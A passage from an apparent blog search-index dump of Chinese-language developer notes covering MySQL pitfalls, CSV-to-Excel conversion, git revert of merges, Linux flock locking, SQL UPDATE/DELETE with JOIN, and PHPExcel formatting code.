時間的地雷\n今天來好好筆記\n\n<!--more-->\n\n## datetime between '2019-01-01' and '2019-02-01'\n\n這個時候需要注意!!\n由於 between 沒有放入時間資料\n查詢結果會是 `2019-01-01 00:00:00` ~ `2019-02-01 00:00:00`\n所以需要使用 `2019-01-01 00:00:00` ~ `2019-01-31 23:59:59`\n\n\n## MySQL '0000-00-00' = 0 會是 true\n\n之前讀到 MySQL '0000-00-00' 可等於 null\n但是 '0000-00-00' = '' 會是 false\n'0000-00-00' = 0 為 true\n這邊就是`隱式轉換`\n可看下面標題\n\n## 隱式轉換 \n\n'123_ff' = 1  為true\n\n[MySQL 隐式类型转换 - ZZZ's blog](http://zzzsdust.com/articles/23/)\n[价值百万的 MySQL 的隐式类型转换 - 互联网技术和架构](https://blog.devopszen.com/mysql_params)\n[MySQL隐式转化整理 - Rollen Holt - 博客园](https://www.cnblogs.com/rollenholt/p/5442825.html)\n\n其他想到在記錄!!\n\n## 其他小記\n\n[Oracle时间类型数据为0的bug(0000-0-0) - 北国风光的专栏 - CSDN博客](https://blog.csdn.net/li19236/article/details/51701374)","tags":["sql"],"categories":["MySQL"]},{"title":"csv2xlsx CSV 轉 Excel 方法","url":"%2Fblog%2F2019%2F08%2F26%2Fcsv2xlsx-CSV-%E8%BD%89-Excel-%E6%96%B9%E6%B3%95%2F","content":"\n最近查詢報表\n用 SQL 查詢 MySQL 資料，產生出 csv 檔案\n但是在 Excel 直接打開會是亂碼，因為 DB 存放資料是 UTF-8\n這個很簡單，使用 Notepad++ 或 vscode 改編碼就可以解決這個問題\n改 Big5 裡面的韓語、日語就會變亂碼\n其實可以手動到 Excel 匯入\n我覺得需要有快速執行工具，就找找現成的 :P\n\n<!--more-->\n\n## tealeg/csv2xlsx\n\n找了這麼多版，終於找到一款可以正常使用。\n[tealeg/csv2xlsx: A simple program to convert CSV files into XLSX files.](https://github.com/tealeg/csv2xlsx)\n\n### 安裝方法\n\n注意前面沒有`http`\n```bash\ngo get github.com/tealeg/csv2xlsx\n```\n\n### 使用方法\n\n```bash\ncsv2xlsx -f=xxxx.csv -o=test.xlsx -d=,\n```\n\n### 移除 golang 程式方法\n\n```bash\n# 看看會做哪些動作，程式安裝在哪裡\ngo clean -i -n github.com/google/acme \n#移除程式\ngo clean -i github.com/google/acme \n```\n\n參考:[Golang get 抓取的套件如何移除 | Tsung's Blog](https://blog.longwin.com.tw/2017/03/golang-get-%E6%8A%93%E5%8F%96%E7%9A%84%E5%A5%97%E4%BB%B6%E5%A6%82%E4%BD%95%E7%A7%BB%E9%99%A4/)\n\n\n### 注意事項\n\n需使用 UTF-8 csv\n產生 Excel 為 utf8\nbig5 會亂碼\n\n\n## 其他的 csv2xlsx\n\n### bash 指令方法\n\nSSConvert \n\nunoconv \n\n但好像都是 Linux ，所以我就沒有嘗試\n\n[bash - convert CSV to XLS file on linux - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/158254/convert-csv-to-xls-file-on-linux)\n\n### 其他\n\n* [mentax/csv2xlsx: Fast and simple opensource command line tool to convert CSV do XLSX](https://github.com/mentax/csv2xlsx)\n* [Armin / csv2xlsx · GitLab](https://gitlab.com/DerLinkshaender/csv2xlsx)\n* [csv2xlsx · PyPI](https://pypi.org/project/csv2xlsx/)\n* [kyoh86/csv2xlsx](https://github.com/kyoh86/csv2xlsx)\n* [truesocialmetrics/service-file-format-convertor-csv2xlsx: convert files from csv to excel](https://github.com/truesocialmetrics/service-file-format-convertor-csv2xlsx)\n* [Golang get 抓取的套件如何移除 | Tsung's Blog](https://blog.longwin.com.tw/2017/03/golang-get-%E6%8A%93%E5%8F%96%E7%9A%84%E5%A5%97%E4%BB%B6%E5%A6%82%E4%BD%95%E7%A7%BB%E9%99%A4/)\n\n\n**2020-01-30**\n\n在想都有 csv2xlsx 應該有 xlsx2csv 吧\n同一個作者有出[tealeg/xlsx2csv: Convert XSLX files to CSV](https://github.com/tealeg/xlsx2csv)\n\n\n## 安裝\n\n```\ngo get github.com/tealeg/xlsx2csv\n```\n\n## 指令\n\n```\nxlsx2csv.exe -o testfile.csv testfile.xlsx\n```\n\n","tags":["xlsx"],"categories":["實用工具"]},{"title":"Git cherry-pick, revert 合併分支的方法","url":"%2Fblog%2F2019%2F08%2F21%2FGit-cherry-pick-revert-%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E7%9A%84%E6%96%B9%E6%B3%95%2F","content":"\n最近想到 revert , cherry-pick 分支好像不能做\n但只細看一下錯誤訊息\n好像能使用\n\n<!--more-->\n\n```sh\ngit revert -m 1 merge_commit_id\n```\n\n`-m` 這個就是用在 (複製/退回)branch 用的\n1 怎麼來的?\n\n\n\n> 如上面的例子中，從 git show 命令的結果中可以看到，merge commit 的 parent 分別為 ba25a9d 和 1c7036f，其中 ba25a9d 代表 master 分支（從圖中可以看出），1c7036f 代表 will-be-revert 分支。需要注意的是 -m 選項接收的參數是一個數字，數字取值為 1 和 2，也就是 Merge 行裡面列出來的第一個還是第二個。\n> 我們要 revert will-be-revert 分支上的內容，即 保留主分支，應該設置主分支為主線，操作如下：\n> ➜ git revert -m 1 bd86846\n[Git 之 revert (撤銷commit或merge) - 我是guyue，guyue就是我O(∩_∩)O - CSDN博客](https://blog.csdn.net/guyue35/article/details/82703065)\n\n\n這邊 git show 指令可以看到兩個 merge commit_id \n通常有兩個， 1 ,2 照順序\n```\n➜  git show bd86846\ncommit bd868465569400a6b9408050643e5949e8f2b8f5\nMerge: ba25a9d 1c7036f\n```\n\n這邊我有想到一個問題\nrevert branch 要怎麼用回來呢\n繼續 revert ?  後來我覺得應該要再 merge  commit id 就可以合併\n\n但是看到這篇 revert commit 再次merge 可能需要注意的事情\n[Git 之 revert - 活到老学到老 - SegmentFault 思否](https://segmentfault.com/a/1190000012897697) {% asset_link web1.png 備份圖 %}\n這篇值得看\n\n\n相關連結:\n* [Git怎样撤销一次分支的合并Merge - SegmentFault 思否](https://segmentfault.com/q/1010000000140446)\n* [git revert merge 的commit - 杨博客 - 博客园](https://www.cnblogs.com/520yang/articles/6732687.html)\n* [Git 之 revert - 活到老学到老 - SegmentFault 思否](https://segmentfault.com/a/1190000012897697)\n* [git cherry-pick -m 例子 - SegmentFault 思否](https://segmentfault.com/q/1010000010185984)\n","tags":["git"],"categories":["Git"]},{"title":"csv 快速建立 MySQL 資料表方法","url":"%2Fblog%2F2019%2F08%2F21%2Fcsv-%E5%BF%AB%E9%80%9F%E5%BB%BA%E7%AB%8B-MySQL-%E8%B3%87%E6%96%99%E8%A1%A8%E6%96%B9%E6%B3%95%2F","content":"\n通常 csv 匯入現有 table\n我今天要建立 table\n~~但我很懶(逃)~~\n在 stackoverflow 找到非常簡單的方法\n\n<!--more-->\n\n\n[database - Create mysql table directly from CSV file using the CSV Storage engine? - Stack Overflow](https://stackoverflow.com/questions/9998596/create-mysql-table-directly-from-csv-file-using-the-csv-storage-engine)\n```sh\n#!/bin/sh\n# pass in the file name as an argument: ./mktable filename.csv\necho \"create table $1 ( \"\nhead -1 $1 | sed -e 's/,/ varchar(255),\\n/g'\necho \" varchar(255) );\"\n```\n\n只要在 command line，參數打 csv 檔案名稱\n`sh xxx.sh xxx.csv`\n可以產生出 create table SQL\n\n\n\n## 匯入 CSV\n由於我是用 Dbeaver 匯入(不知道 phpmyadmin不讓我匯入)\n有空再來補 SQL 要怎麼做\n~~結束這回合~~\n我遇到資料有換行的問題 Dbeaver 可以正常執行\n\n\n## CSV 當作 SQL 撈取方法\n\n最近在想取得 csv 如何快速當作 DB 查詢方法\n發現 Dbeaver 可以使用這個方式[Importing a CSV into a database using DBeaver | Just Numbers & Things](https://justnumbersandthings.com/post/2018-06-12-dbeaver-import-csv/)\n只是建立連線(CSV)，選一個資料夾，裡面的 csv 會當成 table\n\n但手動組 SQL，由於不能設定主鍵，所以可能還需要而外建立table\n這點有點可惜了，但我覺得還滿實用\n\n**須注意`\\\"`會導致查詢會有問題，建議先手動取代`\\\"`改別的符號**\n不知道是不是bug??","tags":["mysql"],"categories":["MySQL"]},{"title":"MySQL 抓出重複資料方法","url":"%2Fblog%2F2019%2F08%2F21%2FMySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95%2F","content":"\n最近收到要抓出資料重複(資料量很大)\n這看起來很簡單，但沒想到讓我想了很久要怎麼做\n最後實作出來筆記一下\n\n<!--more-->\n\n## EXCEL 過濾法\n\n可以透過 Excel 抓重複資料\n教學: [Excel 找出重複內容，標示或刪除相同資料教學 - G. T. Wang](https://blog.gtwang.org/windows/excel-find-highlight-delete-duplicate-row/)\n之後可以透過 Excel 篩選過濾抓出來(或刪掉)\n\n~~但我發現我要查詢重複條件有2個以上，所以這招無效~~\n我剛剛想到用兩個欄位尋找重複資料，再篩選多個資料\n{% asset_img 1.png Excel抓取重複資料 %}\n\n{% asset_img 2.png 篩選多個資料 %}\n\n~~其實能不用寫程式方法最好~~\n\n## SQL 簡單反查法\n\n不推薦使用，但適合少資料使用\n我們知道 MySQL 做重複資料可以用 `group by` 和 `having count(1) > 1`\n但是資料表唯一值`id`就會被過濾掉\n這不是我們要的\n\n可以透過重複欄位做 or 反查\n但是我資料表資料太多\n這招不行啊!!!\n\n## JOIN 方法\n\n這一招可以簡單抓到我要的資料\n但是代價就是需要時間跑\n\n```sql\nselect a.id,\na.xxxxxx\n(select xxxxxx from oooo r where id = a.vvvv) as v, \na.xxx,\na.xxxx\n(Select count(1) from s where s.vvv = a.vvvvv) count,\n(Select SUBSTRING(replace(min(i),'-',''),1,3) from s2  where s2.id = a.id) as s2_t\nfrom a1  a  inner join a1 b on a.status=\"active\" and  a.name = b.name and a.note = b.note and a.id != b.id \ngroup by a.id\n```\n\n\n## 最正規的作法\n\n有查到可以用大數據的 MapReduce \n感覺這種東西應該應用在大數據\n只是我沒研究，就先放著\n\n[Mongo入门：数据去重之MapReduce，Aggregation的简单使用（另附相关网络资源） - V_code的博客 - CSDN博客](https://blog.csdn.net/V_code/article/details/54093671)\n\n\n\n## Excel 備註小記\n\n上述因為要抓多個資料，可以先跑一次\n匯入到自己 localhost DB ，多個條件可以做index，這樣搜尋不用花太多時間\n\n### csv檔案編碼\n\nDB 是 UTF8 ， CSV 需要用 notepad++ 和 visual studio code 轉 Big5\n否則 Excel 開會亂碼\n\n### 多國語系貼到 Excel 要注意的事項\n\n可以用 Excel 會入 csv 載入方式 (但需要注意有沒有資料有換行符號，可以先人工把放行用掉，正常應該不會遇到，但我資料有這樣orz)\n匯入建議把所有資料變成`文字`，不然會發生資料跑錯欄位情形\n\n\n\n其他相關連結:\n\n[[MYSQL]利用 SQL 找出欄位值重覆的記錄 @ 紀錄些小事情 :: 痞客邦 ::](https://killworm737.pixnet.net/blog/post/21934570-%5Bmysql%5D%E5%88%A9%E7%94%A8-sql-%E6%89%BE%E5%87%BA%E6%AC%84%E4%BD%8D%E5%80%BC%E9%87%8D%E8%A6%86%E7%9A%84%E8%A8%98%E9%8C%84)\n[從MYSQL資料庫中找出重複的資料並刪除 @ 緒含的部落格 :: 痞客邦 ::](https://senkao.pixnet.net/blog/post/28556740-%E5%BE%9Emysql%E8%B3%87%E6%96%99%E5%BA%AB%E4%B8%AD%E6%89%BE%E5%87%BA%E9%87%8D%E8%A4%87%E7%9A%84%E8%B3%87%E6%96%99%E4%B8%A6%E5%88%AA%E9%99%A4)","tags":["mysql"],"categories":["MySQL"]},{"title":"flock 防止重新執行方法","url":"%2Fblog%2F2019%2F08%2F19%2Fflock-%E9%98%B2%E6%AD%A2%E9%87%8D%E6%96%B0%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95%2F","content":"\n印象中以前寫 PHP 有用過 flock\n但這只用在簡單 PHP 上面\n最近看到flock指令\n突然想啟以前寫 PHP\n有用過這個\n\n<!--more-->\n\n[RPubs - Linux 小撇步：利用flock來做同步和非同步應用](https://rpubs.com/wush978/flock) {% asset_link web3.png 備份圖 %}\n\n裡面有提到flock 基本用法\n```sh\n#! /bin/bash\nsleep 10\ndate\n```\n> 儲存成test.sh並且打開執行權限（chmod 700 test.sh）\n> 此時如果我們打開兩個shell, 並且約同時執行：\n\n> flock /tmp/demo.lock /tmp/test.sh\n\n簡單測試用兩個command line 測試\n但我還不確定有沒有照順序執行\n\n我有簡單開三個command line 測試\n確定不會照順序執行\n\nflock 預設為`-x` \n\n`-c` 後面下 command line，通常放在最後面\n\n\n`-x` exclusive lock\n\n`-s` shared lock\n\n`-n` or `-xn` or `-sn`\n~~當下有執行程式(錯誤說法)~~，不會執行程式\n\n有趣的xxx.lock檔案一直都會在!!!\n\n簡單來說就是當 shared lock，別的程式 (shared lock) 還是能執行，但是 exclusive lock 不行\n反之\n當 exclusive lock 程式執行， shared lock 和 exclusive lock 都不能執行!!!\n\n可以開三個 command line 玩玩看\n\n```\nflock -s  /tmp/demo.lock /tmp/test.sh\nflock -x  /tmp/demo.lock /tmp/test.sh\nflock -sn  /tmp/demo.lock /tmp/test.sh\nflock -xn  /tmp/demo.lock /tmp/test.sh\n```\n## linux lock 種類\n\n* shared lock\n\n* exclusive lock\n\n> 同時持有一個shared lock的process數量並沒有限制. 但同時只有一個process有exclusive lock.(Exclusive lock會拒絕其他shared lock和exclusive lock)\n> 無論process對於檔案的存取方式為何(R/W, ReadOnly, WriteOnll), 都可以使用flock()對檔案加上shared lock或exclusive lock\n> shared lock跟exclusive lock可以互相轉換. 但轉換的過程不是atomic的. 轉換的步驟是先移除舊的鎖然後建立新的鎖. 中間若有另一個新鎖上去, 轉換過程就會發生失敗並且失去原本的鎖。\n> 再將shared lock轉成exclusive lock的過程中. 若有另一個process持有相同的shared lock, 那他就會被blocking, 除非他有設置LOCK_NB\n\n參考: [CODING IS ART: Linux 檔案鎖(File Locking)](http://objectaline19.blogspot.com/2017/03/linux-file-locking.html) {% asset_link web1.png 備份圖 %}\n\n\n我覺得善用這個特性，寫排成會非常方便\n印象中有看過程式適用`ps`去看關鍵字找東西\n但透過這個真的會很方便，又不用寫程式!!!\n\n更多設定方法可參考 [Linux 防止 Shell 指令稿重複執行教學 - G. T. Wang](https://blog.gtwang.org/linux/prevent-shell-script-duplicate-executions/) {% asset_link web2.png 備份圖 %}\n\n\n**2019-10-01**\n找到查看 lock 檔案方法\n[[Linux] 使用 lsof, lslocks, fuser 指令列出目前鎖定中的 file locks | EPH 的程式日記](https://ephrain.net/linux-%E4%BD%BF%E7%94%A8-lsof-lslocks-fuser-%E6%8C%87%E4%BB%A4%E5%88%97%E5%87%BA%E7%9B%AE%E5%89%8D%E9%8E%96%E5%AE%9A%E4%B8%AD%E7%9A%84-file-locks/)\n[process - How to list processes locking file? - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/85994/how-to-list-processes-locking-file)\n\n**2019-10-26**\n\n最近上了 Swoole 課程\n最近用 rclone 寫 tranmission 腳本\n使用 flock 防止重覆執行\n沒有預到問題\n但最近我也觀查到 rclone 上傳的時候\n~~會開很多`子程序`~~ 結果是執行緒\n~~但我沒有預到什麼問題~~ 結果是執行緒 😜\n\n在上 swoole 裡面有提到子程序 fork 主程序\n這時候主程序會跟子程序變數做隔離\n~~但我很好奇 flock 竟然能讓子程序繼續運作~~ 結果是執行緒 🤷‍\n但我覺得 flock 沒辦法測試子程序執行狀況，畢竟是用 flock 指令\n\n上面再搞笑 orz，還好有翻到這篇\n補充一下， n 個 thread 都在同一個 process\n所以算同一個程序，應該不會有 lock 問題\n剛剛看到[Ununtu htop - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/questions/10194441?sc=rss.qu)\n~~瞬間被打臉~~，原來綠色不是子程序，但為什麼會有獨立的 PID?\n> 綠色字的是 Thread ，你可以在 Setup -> Display options -> Hide userland process thread 選項做調整，看你要不要顯示\n> 另外你也可以按 F5 切換 Tree view ，這樣就可以明確的看出來那些綠字的 thread 是屬於哪個 process 的\n\n最後有看到比較詳細的介紹[[筆記]Linux的thread和signal - petertc - Medium](https://medium.com/@petertc/thread-and-signal-in-linux-4f2038d18fd) {% asset_link web4.png 備份圖 %}\n> 同process的thread會有相同的process id，且個別有thread id。對於multithread的process，process id又稱為thread group id\n> ...\n> 圖中Command欄位是綠色代表這是一個thread，其PID欄位值其實是thread id。圖中ipython共有有三個thread（一個leader, 兩個member）\n\n原來是我誤會大了!!難怪怎麼對 thread 做 kill 沒有效果\n更多 process 介紹可以看這篇[[筆記]Linux的process和signal - petertc - Medium](https://medium.com/@petertc/session-process-group-and-signal-in-linux-7fbe85c0b0c5)\n\n因為我在 Raspberry PI 觀察\n[[Linux] 使用 lsof, lslocks, fuser 指令列出目前鎖定中的 file locks | EPH 的程式日記](https://ephrain.net/linux-%E4%BD%BF%E7%94%A8-lsof-lslocks-fuser-%E6%8C%87%E4%BB%A4%E5%88%97%E5%87%BA%E7%9B%AE%E5%89%8D%E9%8E%96%E5%AE%9A%E4%B8%AD%E7%9A%84-file-locks/)\n預設沒有使用 lsof 所以就不測試了\nlslock\n```\nCOMMAND           PID  TYPE SIZE MODE  M START END PATH\ncron              304 FLOCK      WRITE 0     0   0 /run...\nflock           17094 FLOCK      WRITE 0     0   0 /...\n(unknown)         278 FLOCK      WRITE 0     0   0 /run...\n(unknown)         281 FLOCK      WRITE 0     0   0 /run...\n```\n不知道我的 PI 怎麼了orz\nPATH 看不到\n\nsudo fuser 可以看到 lock 檔案\n```\npi@raspberrypi:~ $ sudo fuser /tmp/rclone.lock\n/tmp/rclone.lock:    17094 17095\n```\n\n\n[flockを孫プロセスに保持させてプロセスの終了までロックを無理やり保持する](https://gist.github.com/beyu/462241bd73ae630cd7ee937a90766046) 不知道這是什麼?先留一下","tags":["flock"],"categories":["Linux"]},{"title":"SQL UPDATE 和 DELETE 趴配 JOIN 方法","url":"%2Fblog%2F2019%2F08%2F16%2FSQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95%2F","content":"\n最近看到 UPDATE 和 DELETE\n可以搭配用 JOIN 方式\n這種常常查詢資料都要搭配程式 for 迴圈實作\n我覺得非常實用\n\n<!--more-->\n\n我網路隨便找一個範例\n[SQL Fiddle](http://sqlfiddle.com/#!9/86b033/1)\n\n## UPDATE ... INNER JOIN\n\n```SQL\nUPDATE comentarios a\n       INNER JOIN respuestas b\n               ON a.comentario_servicio = b.respuesta_servicio\nSET    a.comentario_servicio = 'fff',\n       b.respuesta_servicio = 'ccc'\nWHERE  b.respuesta_servicio = 'T.I'\n```\n\n透過 `JOIN` 方式可以同時改兩張表的資料\n但還有更神奇的妙用\n就是把`b`表換成子查詢\n可以用 JOIN 方式改變`a`表的內容\n省了寫程式 code\n**超級實用**\n\n```SQL\nUPDATE comentarios a\n       INNER JOIN (SELECT\n          xxx,\n          if(xxx,ooo,bbb) as set_value\n          FROM ....\n          ....\n          ...\n       ) b\n        ON a.comentario_servicio = b.respuesta_servicio\nSET    a.comentario_servicio = set_value\nWHERE  b.respuesta_servicio = 'T.I'\n```\n\n## DELETE ... INNER JOIN\n\nDELETE 也能搭配 JOIN\n不過有點跟原本 DELETE 不太一樣\n\n如下\n\n```sql\nDELETE a,b\nFROM       comentarios a\nINNER JOIN respuestas b\nON         a.comentario_servicio = b.respuesta_servicio\nWHERE      b.respuesta_servicio = 'T.I';\n```\n\n通常穩們用的 DELETE 都是改`from`表\n但 JOIN 不是這樣，是針對 DELETE 後面 table 命名 a,b 做刪除\n當然也可以不用刪除兩張表\n`DELETE a FROM ...`\n或\n`DELETE b FROM ...`\n都可以指定刪除\n\n此招也很實用\n\n## 鎖表的問題\n\n上面妙招還是會有一些缺點\nSQL 鎖表對一些資料表會造成些問題\n有爬到[mysql insert 锁机制【转】 - paul_hch - 博客园](https://www.cnblogs.com/paul8339/p/6877729.html) {% asset_link web1.png 備份圖  %}\n\n## 其他\n\nSQL 也有一些實用用法\n\n```sql\nINSERT INTO xxx SELECT...\n```\n\n```sql(mysql)\nREPLACE INTO ....\n```\n\n```sql\nINSERT INTO .... ON DUPLICATE KEY UPDATE\n```\n\n[（mysql）replace into ...与 insert into ... on duplicate key update 对比分析 - Abysscarry 的博客 - CSDN 博客](https://blog.csdn.net/abysscarry/article/details/80518278)\n[mysql 中 replace into 与 insert into on duplicate key update 的使用和不同点 - 怀素真 - 博客园](https://www.cnblogs.com/jkko123/p/7285641.html)\n[MySQL 的 Replace into 与 Insert into on duplicate key update 真正的不同之处 - xlxxcc 的专栏 - CSDN 博客](https://blog.csdn.net/xlxxcc/article/details/52439734)\n","tags":["insert"],"categories":["MySQL"]},{"title":"ISO 8601 時間格式 XXXX-XX-XXTXX:XX:XXZ","url":"%2Fblog%2F2019%2F08%2F14%2FISO-8601-%E6%99%82%E9%96%93%E6%A0%BC%E5%BC%8F-XXXX-XX-XXTXX-XX-XXZ%2F","content":"\n之前有看到這個時間格式\n但一直沒有紀錄\n最近剛好看到這個時間格式\n筆記筆記\n\n<!--more-->\n\n一開始的時候，我不知道這個時間格式是什麼名稱`ISO 8601`\n剛好看到 php 官網[PHP: DateTime - Manual](https://www.php.net/manual/en/class.datetime.php)\n`const string DateTimeInterface::ISO8601 = \"Y-m-d\\TH:i:sO\"`\n所以才找到名稱...\n\n有爬到這一篇詳細記錄[关于“时间”的一次探索 - 前端涨姿势 - SegmentFault 思否](https://segmentfault.com/a/1190000004292140) {% asset_link 備份圖 web1.png %}\n\n因為 MySQL 不能使用 ISO 8601 儲存\n所以在使用 Laravel 能不能搭配 Carbon\n還需要研究，有空實作在補\n","tags":["timezone"],"categories":["程式心法"]},{"title":"PHP -q 是什麼指令","url":"%2Fblog%2F2019%2F08%2F14%2FPHP-q-%E6%98%AF%E4%BB%80%E9%BA%BC%E6%8C%87%E4%BB%A4%2F","content":"\n最近看到公司舊的排程有這個指令\n`php -h` 沒有看到\n後來官網看到被廢棄掉\n\n<!--more-->\n\n稍微研究了一下\n好像跟以前執行程式有關係\n\n```\n $ php-cgi p.php\n\n    X-Powered-By: PHP/5.5.18\n    Content-type: text/html\n    hello world\n\nYou can suppress these headers:\n$ php-cgi -q p.php\n    hello world\nThe php executable in recent versions of PHP doesn't need this. Using -q or not using -q gives the same result:\n    $ php -q p.php\nhello world\n$ php p.php\nhello world\n```\n\n參考來源:\n[What does 'PHP -q' do as opposed to 'PHP' when executing a PHP script from command line? - Quora](https://www.quora.com/What-does-PHP-q-do-as-opposed-to-PHP-when-executing-a-PHP-script-from-command-line)\n\n排程\n[用于监控 cron 作业和自动化任务的系统？ - VoidCC](http://cn.voidcc.com/question/p-zeaiytux-bbx.html)\n","tags":["php"],"categories":["PHP"]},{"title":"MySQL 查看資料表權限","url":"%2Fblog%2F2019%2F08%2F14%2FMySQL-%E6%9F%A5%E7%9C%8B%E8%B3%87%E6%96%99%E8%A1%A8%E6%AC%8A%E9%99%90%2F","content":"\n最近想看資料表有哪些 user 權限\n因為不常下，所以特別筆記\n\n<!--more-->\n\n[permissions - mysql: Show GRANTs for all users - Database Administrators Stack Exchange](https://dba.stackexchange.com/questions/23265/mysql-show-grants-for-all-users)\n\n裡面有很多方法，後來挑選出這個，可搭配 where 查詢\n\n```sql\nselect Host, Db, User, Insert_priv, Update_priv, Delete_priv, Create_tmp_table_priv, Alter_priv from mysql.db\n```\n\n[查詢 MySQL 對 此帳號 開放(GRANT)哪些權限 | Tsung's Blog](https://blog.longwin.com.tw/2009/06/query-mysql-show-grant-permission-2009/)\n\n```sql\nSHOW GRANTS;\nSHOW GRANTS FOR CURRENT_USER;\nSHOW GRANTS FOR CURRENT_USER();\n```\n","tags":["mysql"],"categories":["MySQL"]},{"title":"PHPExcel 使用小記","url":"%2Fblog%2F2019%2F08%2F08%2FPHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%2F","content":"\n最近做報表業務，有包含一些排版，對這些非常不熟\n竟然都用了，紀錄一下我覺得實用筆記\nPHPExcel 已經被廢棄了，取而代之的是[PHPOffice/PhpSpreadsheet: A pure PHP library for reading and writing spreadsheet files](https://github.com/PHPOffice/PhpSpreadsheet)\n但這篇還是以 PHPExcel 為主\n\n<!--more-->\n\n[PHPOffice/PHPExcel: ARCHIVED](https://github.com/PHPOffice/PHPExcel)\n\nPhpSpreadsheet 一些 note 可以看[phpspreadsheet 开发手记 - leestar54 - 博客园](https://www.cnblogs.com/leestar54/p/7786806.html) {% asset_link web1.png 備份圖 %}\n\n## 載入 PHPEXCEL\n\n[PHPExcel/Classes at 1.8 · PHPOffice/PHPExcel](https://github.com/PHPOffice/PHPExcel/tree/1.8/Classes)\n\n```php\n/** PHPExcel */\nrequire_once \"lib/excel/PHPExcel.php\";\n/** PHPExcel_IOFactory */\nrequire_once \"lib/excel/PHPExcel/IOFactory.php\";\n```\n\n## worksheet(工作表)設定\n\n```php\n// 建立工作表並指定名稱\n$index = 0;\n$objPHPExcel->setActiveSheetIndex($index);  //設定預設顯示的工作表\n// Rename sheet(sheet名稱)\n// 重新命名 sheet 名稱\n$month_date = substr($ym, 0, 4).\".\".substr($ym, -2);\n$objPHPExcel->getActiveSheet()->setTitle($month_date);\n```\n\n## 背景顏色設定\n\n```php\n//設定背景顏色為\"鮮黃色\" (單色)\n$objPHPExcel->getActiveSheet()->getStyle(\"A1:A2\")->applyFromArray(\n    array(\n        \"fill\" => array(\n            \"type\" => PHPExcel_Style_Fill::FILL_SOLID,\n            \"color\"=> array(\"rgb\" => \"FFFF00\") ),\n    )\n);\n//設定背景顏色為\"淡黃色\"\n$backcolor = array(\n    'fill' => array(\n        'type' => PHPExcel_Style_Fill::FILL_SOLID,\n        'color'=> array('rgb' => 'FFFFAB')\n    ),\n);\n$objPHPExcel->getActiveSheet()->getStyle(\"A1\")->applyFromArray($backcolor);\n$objPHPExcel->getActiveSheet()->getStyle(\"A3:B3\")->applyFromArray($backcolor);\n```\n\n## 設定框線格式\n\n```php\n// 設定框線格式\n// 用陣列設定 全框線\n$style_array = array(\n    'borders' => array(\n        'allborders' => array(\n            'style' => PHPExcel_Style_Border::BORDER_THIN,\n            'color' => array('rgb' => '000000') ),\n    )\n);\n$objPHPExcel->getActiveSheet()->getStyle(\"A1:O\".$rows_count.\"\")->applyFromArray($style_array);\n// 下底線\n// 總計很常用到\n$bottom = array(\n'borders' => array(\n    'bottom'  => array(\n        'style' => PHPExcel_Style_Border::BORDER_MEDIUM,\n        'color' => array('rgb' => '000000') ),\n)\n);\n```\n\n## 字體設定\n\n```php\n// 設定字型大小\n$objPHPExcel->getActiveSheet()->getStyle(\"A1\")->getFont()->setSize(11);\n$objPHPExcel->getActiveSheet()->getStyle(\"A2:B10\")->getFont()->setSize(10);\n// 粗體\n$objPHPExcel->getActiveSheet()->getStyle(\"A1:B2\")->getFont()->setBold(true);\n$objPHPExcel->getActiveSheet()->getStyle(\"A6:I6\")->getFont()->setBold(true);\n$objPHPExcel->getActiveSheet()->getStyle(\"N2\")->getFont()->setBold(false);\n// 動態算位置技巧\n$objPHPExcel->getActiveSheet()->getStyle(\"A\".($rows_count).\":O\".($rows_count).\"\")->getFont()->setBold(true);\n// 自動換行\n$objPHPExcel->getActiveSheet()->getStyle(\"A3:B3\")->getAlignment()->setWrapText(true);\n```\n\n## 欄位給予值\n\n```php\n//設定A1欄位顯示文字2015-08\n$month_date = substr($ym, 0, 4).\"-\".substr($ym, -2);\n$objPHPExcel->getActiveSheet()->setCellValue(\"A1\", $month_date );\n```\n\n## 欄位類型\n\n```php\n//設定成數字\n$objPHPExcel->getActiveSheet()->getCell(\"B20\")->setValueExplicit(1000, PHPExcel_Cell_DataType::TYPE_NUMERIC);\n//設定成百分比\n$objPHPExcel->getActiveSheet()->getStyle(\"B20\")->getNumberFormat()->setFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE_00);\n```\n\n## 欄位對齊方式\n\n```php\n//水平對齊 setVertiacl 垂直對齊 setHorizontal\n/*\nVERTICAL_CENTER 垂直置中\nVERTICAL_TOP\nHORIZONTAL_CENTER\nHORIZONTAL_RIGHT\nHORIZONTAL_LEFT\nHORIZONTAL_JUSTIFY\n*/\n$objPHPExcel->getActiveSheet()->getStyle(\"A1:B3\")->getAlignment()->setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);\n$objPHPExcel->getActiveSheet()->getStyle(\"A1:B3\")->getAlignment()->setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);\n$objPHPExcel->getActiveSheet()->getStyle(\"A1:A\".$rows_count.\"\")->getAlignment()->setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);\n$objPHPExcel->getActiveSheet()->getStyle(\"B1:B\".$rows_count.\"\")->getAlignment()->setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);\n\n/**\n* 合併儲存格\n*/\n$objPHPExcel->getActiveSheet()->mergeCells(\"A1:B1\");\n// or\n$objPHPExcel->setActiveSheetIndex(0)->mergeCells('A1:C1');\n/**\n* 取消 合併儲存格\n**/\n// [How to Merge/unmerge cells in PHPExcel | Degree Documentation](https://degreedocumentation.wordpress.com/2012/08/17/how-to-mergeunmerge-cells/)\n$objPHPExcel->getActiveSheet()->unmergeCells('A18:E22');\n```\n\n## 字體顏色\n\n```php\n// 設定字體顏色\n/*\n這裡有列出可用英文單字表示的顏色，並不多。\nCOLOR_BLACK\nCOLOR_BLUE\nCOLOR_DARKBLUE\nCOLOR_DARKGREEN\nCOLOR_DARKRED\nCOLOR_DARKYELLOW\nCOLOR_GREEN\nCOLOR_RED\nCOLOR_WHITE\nCOLOR_YELLOW\n*/\n$gray = array(\n'font'  => array(\n    'color' => array('rgb' => 